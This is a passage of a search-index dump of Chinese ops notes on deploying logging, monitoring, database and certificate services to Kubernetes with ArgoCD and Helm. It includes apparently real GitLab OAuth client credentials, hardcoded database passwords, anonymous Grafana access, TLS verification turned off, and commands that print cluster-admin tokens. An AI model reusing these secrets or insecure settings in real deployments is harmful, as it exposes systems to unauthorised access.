/var/lib/grafana/\n    logs: /var/log/grafana\n    plugins: /var/lib/grafana/plugins\n    provisioning: /etc/grafana/provisioning\n  analytics:\n    check_for_updates: true\n  log:\n    mode: console\n  server:\n    domain: \"{{ if (and .Values.ingress.enabled .Values.ingress.hosts) }}{{ .Values.ingress.hosts | first }}{{ end }}\"\n    root_url: \"https://{{ if (and .Values.ingress.enabled .Values.ingress.hosts) }}{{ .Values.ingress.hosts | first }}{{ end }}\"\n  database:\n    type: mysql\n    host: mysql-standalone\n    name: grafana\n    user: grafana\n    password: xx\n  auth.anonymous:\n    enabled: true # \u5141\u8bb8\u533f\u540d\u8bbf\u95ee\n  auth.gitlab:\n    enabled: true\n    allow_sign_up: true\n    auto_login: true\n    client_id: a1fd48ae1a25482c9fda1377065f424c5b519e5a91c4e385a5ab97cce65556e7\n    client_secret: d06a9893f80001e9c714fb3dc231d41e16a2a2a9b900acaf8340304cfb686871\n    scopes: read_api\n    auth_url: https://git.8ops.top/oauth/authorize\n    token_url: https://git.8ops.top/oauth/token\n    api_url: https://git.8ops.top/api/v4\n    tls_skip_verify_insecure: true # \u5141\u8bb8\u79c1\u6709\u8bc1\u4e66\n</code></pre>"},{"location":"kubernetes/04-argocd/#311-elastic","title":"3.11 elastic","text":"<p>Reference</p>"},{"location":"kubernetes/04-argocd/#3111-elastic","title":"3.11.1 elastic","text":"<pre><code>helm repo add elastic https://helm.elastic.co\nhelm repo update elastic\nhelm search repo elastic\nhelm pull elastic/elasticsearch --version 7.17.3 -d /tmp\ntar xf /tmp/elasticsearch-7.17.3.tgz -C .\n\ncd elasticsearch\nvim values-master.yaml\nvim values-data.yaml\nvim values-client.yaml\n\nargocd proj add-destination control-plane-proj \\\n    https://kubernetes.default.svc elastic-system\n\nargocd app create elastic-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path elasticsearch/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm        \n\nargocd app create elastic-master \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path elasticsearch \\\n    --project control-plane-proj \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-master.yaml\n\nargocd app create elastic-data \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path elasticsearch \\\n    --project control-plane-proj \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-data.yaml\n\nargocd app create elastic-client \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path elasticsearch \\\n    --project control-plane-proj \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-client.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#3112-kibana","title":"3.11.2 kibana","text":"<pre><code>helm search repo kibana\nhelm pull elastic/kibana --version 7.17.3 -d /tmp\ntar xf /tmp/kibana-7.17.3.tgz -C .\n\ncd kibana\nvim values-ops.yaml\n\nargocd app create kibana \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path kibana \\\n    --project control-plane-proj \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#3113-kafka","title":"3.11.3 kafka","text":"<pre><code>helm repo update bitnami\nhelm search repo kafka\nhelm pull bitnami/kafka --version 19.0.1 -d /tmp\ntar xf /tmp/kafka-19.0.1.tgz -C .\n\ncd kafka\nvim values-ops.yaml\n\nargocd app create kafka \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path kafka \\\n    --project control-plane-proj \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n\n# kafka-ui\nargocd app create kafka-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path kafka/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --auto-prune \\\n    --label author=jesse \\\n    --label tier=directory \\\n    --label owner=ops \n</code></pre> <p>Reference</p>"},{"location":"kubernetes/04-argocd/#3114-logstash","title":"3.11.4 logstash","text":"<pre><code>helm search repo logstash\nhelm pull elastic/logstash --version 7.17.3 -d /tmp\ntar xf /tmp/logstash-7.17.3.tgz -C .\n\ncd kibana\nvim values-ops.yaml\n\nargocd app create logstash \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path logstash \\\n    --project control-plane-proj \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#3115-filebeat","title":"3.11.5 filebeat","text":"<pre><code># demo\nargocd app create logstash-extention \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path logstash/extention \\\n    --project control-plane-proj \\\n    --directory-recurse \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm     \n\n# daemonset\nhelm search repo filebeat\nhelm pull elastic/filebeat --version 7.17.3 -d /tmp\ntar xf /tmp/filebeat-7.17.3.tgz -C .\n\nvim values-ops.yaml\n\nargocd app create filebeat \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path filebeat \\\n    --project infrastructure \\\n    --dest-namespace elastic-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --label owner=ops \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#312-cmdb","title":"3.12 cmdb","text":""},{"location":"kubernetes/04-argocd/#3121-zookeeper","title":"3.12.1 zookeeper","text":"<pre><code>argocd proj get infrastructure\nargocd proj add-destination infrastructure \\\n    https://kubernetes.default.svc cmdb-system\n\n # app version: 3.8.1\nhelm search repo zookeeper\nhelm pull bitnami/zookeeper --version 11.4.2 -d /tmp\ntar xf /tmp/zookeeper-11.4.2.tgz -C .\n\nvim values-ops.yaml\n\nargocd app create zookeeper \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path zookeeper \\\n    --project infrastructure \\\n    --dest-namespace cmdb-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --label owner=ops \\\n    --values values-ops.yaml\n</code></pre>"},{"location":"kubernetes/04-argocd/#3132-mongo","title":"3.13.2 mongo","text":"<p>Reference</p> <pre><code>helm search repo mongodb\nhelm pull bitnami/mongodb --version 13.15.1 -d /tmp\ntar xf /tmp/mongodb-13.15.1.tgz -C .\n\n# app version: 6.0.6\nvim values-single.yaml\n# vim values-replicaset.yaml\n# vim values-sharded.yaml\n\n# standalone\nargocd app create mongodb \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path mongodb \\\n    --project infrastructure \\\n    --dest-namespace cmdb-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --label owner=ops \\\n    --values values-standalone.yaml\n\n# replicaset\nargocd app create mongodb \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path mongodb \\\n    --project infrastructure \\\n    --dest-namespace cmdb-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --label owner=ops \\\n    --values values-replicaset.yaml\n\nhelm search repo mongodb-sharded\nhelm pull bitnami/mongodb-sharded --version 6.5.3 -d /tmp\ntar xf /tmp/mongodb-sharded-6.5.3.tgz -C .\n\n# sharded\nargocd app create mongodb-sharded \\\n    --repo https://git.8ops.top/ops/control-plane-ops.git \\\n    --path mongodb-sharded \\\n    --project infrastructure \\\n    --dest-namespace cmdb-system \\\n    --dest-server https://kubernetes.default.svc \\\n    --revision master \\\n    --sync-policy automated \\\n    --label author=jesse \\\n    --label tier=helm \\\n    --label owner=ops \\\n    --values values-sharded.yaml    \n\nmongosh -u root -p jesse\nshow dbs\nshow users;\nrs.status();\nuse test;\ndb.createUser({user: \"test\",pwd: \"test\",roles: [ { role: \"readWrite\", db: \"test\" } ]});\n</code></pre>"},{"location":"kubernetes/04-argocd/#_3","title":"\u56db\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"kubernetes/04-argocd/#41","title":"4.1 \u52a0\u5165\u96c6\u7fa4\u8ba4\u8bc1\u95ee\u9898","text":"<ol> <li>\u767d\u540d\u5355</li> <li>\u901a\u8fc7 token \u8d70 insecure</li> <li>\u901a\u8fc7 kubeconfig \u5f53\u5f15\u7528\u5916\u90e8 ca \u6587\u4ef6\u65f6\u6ce8\u610f\u5f15\u5165\u76ee\u5f55</li> </ol>"},{"location":"kubernetes/04-argocd/#42-kubernetes-cluster-argocd","title":"4.2 kubernetes cluster \u591a\u5957 argocd","text":"<pre><code># helm values\ncrds:\n  install: false\n  keep: true\n</code></pre> <p>\u5f53\u540c\u4e00\u547d\u540d\u7a7a\u95f4\u591a\u6b21\u90e8\u7f72\u65f6\uff0c\u4e0d\u7ba1\u662f\u5426\u662f\u540c\u4e00\u5957 argocd \u4f1a\u81ea\u52a8\u52a0\u8f7d\u4e4b\u524d\u7684\u914d\u7f6e\u4fe1\u606f\u3002</p>"},{"location":"kubernetes/04-argocd/#43-parameters-valuesyaml","title":"4.3 \u754c\u9762 PARAMETERS \u65e0\u6cd5\u8bc6\u522b\u51fa values.yaml","text":"<pre><code>argocd proj add-source argo-example-proj https://git.8ops.top/gce/argocd-example-apps.git\n</code></pre>"},{"location":"kubernetes/04-argocd/#44-configmap","title":"4.4 \u751f\u6210\u7684configmap\u672a\u8de8\u884c","text":"<pre><code># \u662f\u7531\u4e8eyaml\u6587\u4ef6\u5b58\u5728\u884c\u672b\u6709\u7a7a\u683c\n\n# e.g.\na:\n  b:\n  - 1\n  - 2 xxxxx\n</code></pre>"},{"location":"kubernetes/05-helm/","title":"Helm","text":"<p>Helm \u662f Kubernetes \u7684\u5305\u7ba1\u7406\u5668\uff0c\u4eceCNCF\u6bd5\u4e1a\u3002</p> <p>\u4f7f\u7528Helm\u5b89\u88c5Kubernetes\u4e2d\u7684\u63d2\u4ef6\u5c06\u4f1a\u53d8\u5f97\u662f\u4e00\u4ef6\u5bb9\u6613\u7684\u4e8b\u60c5\u3002</p> <p>Reference</p> <ul> <li> <p>docs</p> </li> <li> <p>hub </p> </li> </ul> <p></p> <p>Helm\u662f\u4e2a\u5f88\u610f\u601d\u7684\u5de5\u5177\uff0c\u7b80\u5316\u4e86kubernetes\u4e0a\u5e38\u7528\u7ec4\u4ef6\u7684\u7ba1\u7406\u3002</p> <p>\u4f18\u5316\u8bbf\u95ee\u955c\u50cf</p> <p>\u4f7f\u7528Helm\u540e\u4f1a\u751f\u6210\u76f8\u5e94\u7684\u7f13\u5b58\u6587\u4ef6\uff0c\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5fc5\u8981\u65f6\u53ef\u4ee5\u4e3b\u52a8\u6e05\u7a7a\u3002\u76ee\u5f55\u5982\u4e0b</p> <ul> <li>~/.config/helm</li> <li>~/.cache/helm</li> </ul> <p>\u5e38\u7528\u6e90</p> <pre><code># helm repo list\nNAME                               URL\nazure                 https://mirror.azure.cn/kubernetes/charts\naliyun                https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts\nelastic               https://helm.elastic.co\ngitlab                https://charts.gitlab.io\nharbor                https://helm.goharbor.io\nbitnami               https://charts.bitnami.com/bitnami\nincubator             https://kubernetes-charts-incubator.storage.googleapis.com\ngoogle                https://kubernetes-charts.storage.googleapis.com\ningress-nginx         https://kubernetes.github.io/ingress-nginx\nkubernetes-dashboard  https://kubernetes.github.io/dashboard/\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528<code>azure</code>\u548c<code>aliyun</code></p> <p>\u63a8\u8350\u914d\u7f6e\u7cfb\u7edf\u7f51\u7edc\u4ee3\u7406</p> <pre><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n</code></pre>"},{"location":"kubernetes/05-helm/#ingress-nginx","title":"\u4e00\u3001Ingress-nginx","text":"<p>\u5bbf\u4e3b\u673akernel\u4f18\u5316</p> <pre><code>sysctl -w net.core.somaxconn=32768; sysctl -w net.ipv4.ip_local_port_range='1024 65000'\n</code></pre> <pre><code>helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx\nhelm repo update ingress-nginx\n\nhelm search repo ingress-nginx\n\nhelm show values ingress-nginx/ingress-nginx --version 4.2.5 &gt; ingress-nginx.yaml-default\n\n# Example\n#   https://books.8ops.top/attachment/kubernetes/helm/ingress-nginx-external.yaml-v4.2.5\n#\n\n# deprecated\n# \u82e5\u4e0dFW\u9700\u8981\u53d8\u66f4 ~/.cache/helm/repository/ingress-nginx-index.yaml \u4ece\u79c1\u6709\u6587\u4ef6\u7ad9\u4e0b\u8f7d\n## sed -i 's#https://github.com/kubernetes/ingress-nginx/releases/download/helm-chart-4.0.13/ingress-nginx-4.0.13.tgz#http://d.8ops.top/ops/helm/ingress-nginx-4.0.13.tgz#' ~/.cache/helm/repository/ingress-nginx-index.yaml\n\n# deprecated\n# \u4f7f\u7528metallb\u540e\u5c31\u65e0\u987blabel\u5728\u8282\u70b9\u4e0a\n# kubectl label no k-kube-lab-11 edge=external\n# kubectl cordon k-kube-lab-11 \n\nhelm install ingress-nginx-external-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx-external.yaml-v4.2.5 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 4.2.5 --debug\n\nhelm list -A\n\n# upgrade\nhelm upgrade ingress-nginx-external-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx-external.yaml \\\n    -n kube-server \\\n    --version 4.2.5 --debug\n\n# uninstall     \nhelm -n kube-server uninstall ingress-nginx-external-controller\n</code></pre> <p>ingress-nginx-external.yaml</p> <pre><code>controller:\n  name: external\n  image:\n    registry: hub.8ops.top\n    image: google_containers/nginx-ingress-controller\n    tag: \"v1.1.0\"\n    digest:\n\n  hostNetwork: true\n  hostPort:\n    enabled: true\n    ports:\n      http: 80\n      https: 443\n\n  config: {} # nginx.conf \u5168\u5c40\u914d\u7f6e\n\n  ingressClassResource:\n    name: external\n    enabled: true\n    default: false\n    controllerValue: \"k8s.io/ingress-nginx\" # \u8fd9\u91cc\u7684nginx\u662f\u7f3a\u7701\u7684ingress-class\n\n  resources:\n    limits:\n      cpu: 500m\n      memory: 1Gi\n    requests:\n      cpu: 200m\n      memory: 256Mi\n\n  kind: DaemonSet\n  nodeSelector:\n    kubernetes.io/os: linux\n    edge: external\n\n  service:\n    enabled: false\n\n  lifecycle:\n  admissionWebhooks:\n    enabled: false\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p> <p>\u5207\u5272\u65e5\u5fd7</p> <pre><code># \u786e\u4fdduid=101,gid=82\u7684\u7528\u6237\u548c\u7ec4\u5b58\u5728\ngroupadd -g 82 nginx-ingress\ncd /data1/log/nginx\n\nchown 101.82 * &amp;&amp; ls -l \n\nsystemctl start logrotate &amp;&amp; ls -l &amp;&amp; sleep 5 &amp;&amp; systemctl status logrotate\n\n# \u8c03\u6574\u5b9a\u65f6\u5668\u4e3a\u5c0f\u65f6\nsed -i 's/OnCalendar=daily/OnCalendar=hourly/' /lib/systemd/system/logrotate.timer\nsystemctl daemon-reload &amp;&amp; sleep 5 &amp;&amp; systemctl status logrotate.timer\n</code></pre> <pre><code># /etc/logrotate.d/nginx\n/var/log/nginx/access.log\n {\n    su systemd-resolve nginx-ingress\n    hourly\n    rotate 180\n    dateext\n    missingok\n    notifempty\n    compress\n    delaycompress\n    nomail\n    sharedscripts\n    postrotate\n        for pid in `/bin/pidof nginx `;do\n            kill -USR1 ${pid}\n        done\n    endscript\n}\n/var/log/nginx/error.log\n {\n    su systemd-resolve nginx-ingress\n    daily\n    rotate 7\n    dateext\n    missingok\n    notifempty\n    compress\n    delaycompress\n    nomail\n    sharedscripts\n    postrotate\n        for pid in `/bin/pidof nginx `;do\n            kill -USR1 ${pid}\n        done\n    endscript\n}\n</code></pre>"},{"location":"kubernetes/05-helm/#dashboard","title":"\u4e8c\u3001Dashboard","text":"<pre><code>helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/\nhelm repo update kubernetes-dashboard\n\nhelm search repo kubernetes-dashboard\n\nhelm show values kubernetes-dashboard/kubernetes-dashboard --version 5.10.0  &gt; kubernetes-dashboard.yaml-v5.10.0-default\n\n# vim kubernetes-dashboard.yaml\n\n# deprecated\n# \u82e5\u4e0dFW\u9700\u8981\u53d8\u66f4 ~/.cache/helm/repository/kubernetes-dashboard-index.yaml \u4ece\u79c1\u6709\u6587\u4ef6\u7ad9\u4e0b\u8f7d\n## sed -i 's#kubernetes-dashboard-5.0.4.tgz#http://d.8ops.top/ops/helm/kubernetes-dashboard-5.0.4.tgz#' ~/.cache/helm/repository/kubernetes-dashboard-index.yaml\n\nhelm install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \\\n    -f kubernetes-dashboard.yaml-v5.10.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 5.10.0 --debug\n\nhelm upgrade kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \\\n    -f kubernetes-dashboard.yaml \\\n    -n kube-server \\\n    --version 5.10.0 --debug\n\n#-----------------------------------------------------------\n# create sa for guest\nkubectl create serviceaccount dashboard-guest -n kube-server\n\n# binding clusterrole\nkubectl create clusterrolebinding dashboard-guest \\\n  --clusterrole=view \\\n  --serviceaccount=kube-server:dashboard-guest\n\n# output token #1\nkubectl describe secrets \\\n  -n kube-server $(kubectl -n kube-server get secret | awk '/dashboard-guest/{print $1}')\n\n# output token #2\nkubectl -n kube-server get secret \\\n  `kubectl -n kube-server get sa dashboard-guest -o jsonpath={.secrets[0].name}` \\\n  -o jsonpath={.data.token} | base64 --decode; echo\n\n#-----------------------------\n# create sa for ops\nkubectl create serviceaccount dashboard-ops -n kube-server\n\n# binding clusterrole\nkubectl create clusterrolebinding dashboard-ops \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=kube-server:dashboard-ops\n\n# create token \uff08\u4ecekubernetes v1.24.0\u5f00\u59cb\u9700\u8981\u624b\u52a8\u521b\u5efasecrets\uff09\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: Secret\nmetadata:\n  name: dashboard-ops-secret\n  namespace: kube-server\n  annotations:\n    kubernetes.io/service-account.name: dashboard-ops\ntype: kubernetes.io/service-account-token\nEOF\n\n# output token\nkubectl describe secrets \\\n  -n kube-server $(kubectl -n kube-server get secret | awk '/dashboard-ops/{print $1}')\n</code></pre> <p>Reference</p> <ul> <li>kubeconfig</li> </ul> <p>vim kubernetes-dashboard.yaml</p> <pre><code>image:\n  repository: hub.8ops.top/google_containers/dashboard\n  tag: v2.4.0\n\nresources:\n  requests:\n    cpu: 200m\n    memory: 256Mi\n  limits:\n    cpu: 1\n    memory: 512Mi\n\ningress:\n  enabled: true\n  annotations:\n    nginx.ingress.kubernetes.io/backend-protocol: \"HTTPS\"\n\n  className: \"external\"\n\n  hosts:\n    - dashboard.8ops.top\n  tls:\n    - secretName: tls-8ops.top\n      hosts:\n        - dashboard.8ops.top\n\nextraArgs: \n  - --token-ttl=86400\n\nsettings:\n  clusterName: \"Dashboard of Lab\"\n  itemsPerPage: 20\n  labelsLimit: 3\n  logsAutoRefreshTimeInterval: 10\n  resourceAutoRefreshTimeInterval: 10\n\nmetricsScraper:\n  enabled: true\n  image:\n    repository: hub.8ops.top/google_containers/metrics-scraper\n    tag: v1.0.7\n  resources:\n    requests:\n      cpu: 100m\n      memory: 128Mi\n    limits:\n      cpu: 100m\n      memory: 128Mi\n\nmetrics-server:\n  enabled: true\n  image:\n    repository: hub.8ops.top/google_containers/metrics-server\n    tag: v0.5.0\n  resources:\n    requests:\n      cpu: 100m\n      memory: 128Mi\n    limits:\n      cpu: 100m\n      memory: 128Mi\n  args:\n    - --kubelet-preferred-address-types=InternalIP\n    - --kubelet-insecure-tls\n</code></pre> <p>\u6f14\u793a\u6548\u679c</p> <p></p> <p></p>"},{"location":"kubernetes/05-helm/#elastic","title":"\u4e09\u3001Elastic","text":"<pre><code>helm repo add elastic https://helm.elastic.co\nhelm repo update elastic\n\n# logstash\nhelm search repo logstash\nhelm show values elastic/logstash &gt; elastic_logstash.yaml-default\n\nhelm install logstash elastic/logstash \\\n    -f elastic_logstash.yaml \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 7.16.2 --debug\n\nhelm upgrade logstash elastic/logstash \\\n    -f elastic_logstash.yaml \\\n    -n kube-server \\\n    --version 7.16.2 --debug\n\n# elastic [failure]\nhelm search repo elastic\nhelm show values elastic/elasticsearch &gt; elasticsearch.yaml-default\n\nhelm install elasticsearch-ops elastic/elasticsearch \\\n        -f elasticsearch.yaml \\\n        -n kube-server \\\n        --create-namespace \\\n        --version 7.17.3 --debug\n\nhelm -n kube-server uninstall elasticsearch-ops        \n\n# elastic_eck\nhelm show values elastic/eck-operator &gt; elastic_eck.yaml-default\n\nhelm install elastic-operator elastic/eck-operator \\\n        -f elastic_eck.yaml \\\n        -n kube-server \\\n        --create-namespace \\\n        --version 1.9.1 --debug\n\nhelm upgrade elastic-operator elastic/eck-operator \\\n        -f elastic_eck.yaml \\\n        -n kube-server \\\n        --create-namespace \\\n        --version 1.9.1 --debug\n\n# origin\nkubectl create -f https://download.elastic.co/downloads/eck/1.9.1/crds.yaml\nkubectl apply -f https://download.elastic.co/downloads/eck/1.9.1/operator.yaml\n\nkubectl -n elastic-system logs -f statefulset.apps/elastic-operator\n</code></pre>"},{"location":"kubernetes/05-helm/#prometheus","title":"\u56db\u3001Prometheus","text":"<pre><code>helm repo add prometheus-community https://prometheus-community.github.io/helm-charts\nhelm repo update prometheus-community\nhelm search repo prometheus\n\n# prometheus\nhelm show values prometheus-community/prometheus &gt; prometheus.yaml-default\n\nhelm upgrade --install prometheus prometheus-community/prometheus \\\n    -f prometheus.yaml \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 15.8.0 --debug\n</code></pre>"},{"location":"kubernetes/05-helm/#cert-manager","title":"\u4e94\u3001Cert-Manager","text":"<p>Reference</p> <pre><code>helm repo add jetstack https://charts.jetstack.io\nhelm repo update jetstack\nhelm search repo cert-manager\n\n# cert-manager\nhelm show values jetstack/cert-manager --version=v1.11.0 &gt; cert-manager.yaml-v1.11.0-default\n\n# Example \n#   https://books.8ops.top/attachment/cert-manager/helm/cert-manager.yaml-v1.9.1\n#   https://books.8ops.top/attachment/cert-manager/helm/cert-manager.yaml-v1.11.0\n#   \n\nhelm upgrade --install cert-manager jetstack/cert-manager \\\n    -f cert-manager.yaml-v1.9.1 \\\n    -n cert-manager \\\n    --create-namespace \\\n    --version v1.9.1 --debug\n\nhelm upgrade --install cert-manager jetstack/cert-manager \\\n    -f cert-manager.yaml-v1.11.0 \\\n    -n cert-manager \\\n    --create-namespace \\\n    --version v1.11.0 --debug\n\n    --set 'extraArgs={--dns01-recursive-nameservers-only,--dns01-recursive-nameservers=119.29.29.29:53\\,114.114.114.114:53}' \\\n\nhelm -n cert-manager uninstall cert-manager\n</code></pre>"},{"location":"kubernetes/05-helm/#51-ca","title":"5.1 \u79c1\u6709CA\u7b7e\u53d1","text":"<pre><code># Example\n# https://books.8ops.top/attachment/cert-manager/clusterissuer-private.yaml\n# https://books.8ops.top/attachment/cert-manager/certificate-private.yaml\n# https://books.8ops.top/attachment/cert-manager/ingress-private.yaml\n#\n\n# 1. ROOT CA\nkubectl -n cert-manager create secret generic ca-key-pair \\\n  --from-file=tls.crt=xx.crt \\\n  --from-file=tls.key=xx.key\n\n# 2. ClusterIssuer \u53ef\u5207\u6362\u6210 Issuer\nkubectl apply -f - &lt;&lt; EOF\napiVersion: cert-manager.io/v1\nkind: ClusterIssuer\nmetadata:\n  name: ca-cluster-issuer\n  namespace: cert-manager\nspec:\n  ca:\n    secretName: ca-key-pair\n    crlDistributionPoints: # \u57df\u540d\u8bc1\u4e66\u540a\u9500\u5217\u8868\n    - \"http://example.com\"\nEOF\n\n# 3. Ingress\nkubectl apply -f - &lt;&lt; EOF\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  annotations:\n    cert-manager.io/cluster-issuer: ca-cluster-issuer # \u81ea\u52a8\u7b7e\u53d1\u6ce8\u89e3\n  labels:\n    app: ingress-private\n  name: ingress-private\n  namespace: default\nspec:\n  ingressClassName: external\n  rules:\n  - host: echoserver.abc.org\n    http:\n      paths:\n      - backend:\n          service:\n            name: echoserver\n            port:\n              number: 8080\n        path: /\n        pathType: Prefix\n  tls:\n  - hosts:\n    - www.abc.org\n    - echoserver.abc.org\n    - \"*.abc.org\"\n    secretName: tls-abc.org # \u81ea\u52a8\u751f\u6210 secret \u540d\u79f0\nEOF    \n\n# 4. view\n~$ kubectl get ing,secret\nNAME                                        CLASS      HOSTS                 ADDRESS         PORTS     AGE\ningress.networking.k8s.io/ingress-private   external   echoserver.abc.org    10.101.11.216   80, 443   8m13s\n\nNAME                  TYPE                DATA   AGE\nsecret/tls-abc.org    kubernetes.io/tls   3      7m10s\n</code></pre>"},{"location":"kubernetes/05-helm/#52-letsencrypt","title":"5.2 LetsEncrypt","text":"<p>\u5b9e\u6d4b\u6548\u679c</p> \u9876\u7ea7\u57df\u540d \u6210\u529f\u4e0e\u5426 *.top x *.cn \u221a *.tech \u221a *.com \u221a <p>Reference</p> <p>cert-manager also supports out of tree DNS providers using an external webhook. Links to these supported providers along with their documentation are below:</p> <ul> <li><code>AliDNS-Webhook</code></li> <li><code>cert-manager-alidns-webhook</code></li> <li><code>cert-manager-webhook-civo</code></li> <li><code>cert-manager-webhook-dnspod</code></li> <li><code>cert-manager-webhook-dnsimple</code></li> <li><code>cert-manager-webhook-gandi</code></li> <li><code>cert-manager-webhook-infomaniak</code></li> <li><code>cert-manager-webhook-inwx</code></li> <li><code>cert-manager-webhook-linode</code></li> <li><code>cert-manager-webhook-oci</code> (Oracle Cloud Infrastructure)</li> <li><code>cert-manager-webhook-scaleway</code></li> <li><code>cert-manager-webhook-selectel</code></li> <li><code>cert-manager-webhook-softlayer</code></li> <li><code>cert-manager-webhook-ibmcis</code></li> <li><code>cert-manager-webhook-loopia</code></li> <li><code>cert-manager-webhook-arvan</code></li> <li><code>bizflycloud-certmanager-dns-webhook</code></li> <li><code>cert-manager-webhook-hetzner</code></li> <li><code>cert-manager-webhook-yandex-cloud</code></li> <li><code>cert-manager-webhook-netcup</code></li> <li><code>cert-manager-webhook-pdns</code></li> </ul>"},{"location":"kubernetes/05-helm/#521-imroc","title":"5.2.1 imroc","text":"<pre><code># cert-manager-webhook-dnspod\nhelm repo add imroc https://charts.imroc.cc\nhelm repo update imroc\nhelm search repo cert-manager-webhook-dnspod\n\nhelm show values imroc/cert-manager-webhook-dnspod --version=1.2.0 &gt; cert-manager-webhook-dnspod-imroc.yaml-1.2.0-default\n\n# Example \n#   https://books.8ops.top/attachment/cert-manager/helm/cert-manager-webhook-dnspod-imroc.yaml-1.2.0\n#   https://books.8ops.top/attachment/cert-manager/certificate-dnspod-imroc.yaml\n#   https://books.8ops.top/attachment/cert-manager/ingress-dnspod-imroc.yaml\n#   \n\nhelm upgrade --install cert-manager-webhook-dnspod-imroc imroc/cert-manager-webhook-dnspod \\\n    -f cert-manager-webhook-dnspod-imroc.yaml-1.2.0 \\\n    -n cert-manager \\\n    --create-namespace \\\n    --version 1.2.0 --debug\n\n# uninstall\nhelm -n cert-manager uninstall cert-manager-webhook-dnspod-imroc\n\nkubectl -n cert-manager delete \\\n    secret/cert-manager-webhook-dnspod-ca \\\n    secret/cert-manager-webhook-dnspod-letsencrypt \\\n    secret/cert-manager-webhook-dnspod-webhook-tls\n\n# view\nkubectl -n cert-manager get \\\n    all,ing,cm,secret,issuer,clusterissuer,certificate,CertificateRequest,cert-manager\n\nkubectl -n default get \\\n    ingress,secret,issuer,clusterissuer,certificate,CertificateRequest,cert-manager\n\n# \u81ea\u52a8\u751f\u6210\n# kubectl apply -f certificate-dnspod-imroc.yaml\n\n# Ingress \u4e2d secret \u7b7e\u53d1\nkubectl apply -f ingress-dnspod-imroc.yaml\n</code></pre>"},{"location":"kubernetes/05-helm/#522-qqshfox","title":"5.2.2 qqshfox","text":"<p>Reference</p> <pre><code>git clone https://github.com/qqshfox/cert-manager-webhook-dnspod.git abc\nmv abc/deploy/cert-manager-webhook-dnspod  cert-manager-webhook-dnspod\n\n# Example \n#   https://books.8ops.top/attachment/cert-manager/helm/cert-manager-webhook-dnspod-qqshfox.yaml\n#   # 